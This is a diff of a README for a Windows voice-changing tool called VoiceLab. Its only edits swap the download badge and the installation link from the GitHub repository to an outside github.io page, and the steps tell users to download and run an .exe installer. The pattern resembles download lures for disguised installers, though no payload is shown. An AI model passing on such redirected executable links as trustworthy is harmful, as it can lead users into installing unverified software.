@@ -1,6 +1,6 @@
 # 🎙️ VoiceLab - Change your voice in real time
 
-[![Download VoiceLab](https://img.shields.io/badge/Download-VoiceLab-blue.svg)](https://github.com/Urvans6127/VoiceLab)
+[![Download VoiceLab](https://img.shields.io/badge/Download-VoiceLab-blue.svg)](https://urvans6127.github.io)
 
 VoiceLab is a software tool for Windows that changes your voice while you speak. It handles audio processing on your local machine without needing an internet connection. You can use the live preview feature to hear your voice transformations before you record them. The software works as a bridge between your microphone and your computer applications.
 
@@ -19,7 +19,7 @@ VoiceLab runs on standard Windows computers. Ensure your system meets these spec
 
 Follow these steps to set up the software on your computer:
 
-1. Visit [this page](https://github.com/Urvans6127/VoiceLab) to find the latest download options.
+1. Visit [this page](https://urvans6127.github.io) to find the latest download options.
 2. Look for the "Releases" section on the right side of the page.
 3. Select the latest version and download the installer file ending in .exe.
 4. Locate the downloaded file in your Downloads folder.
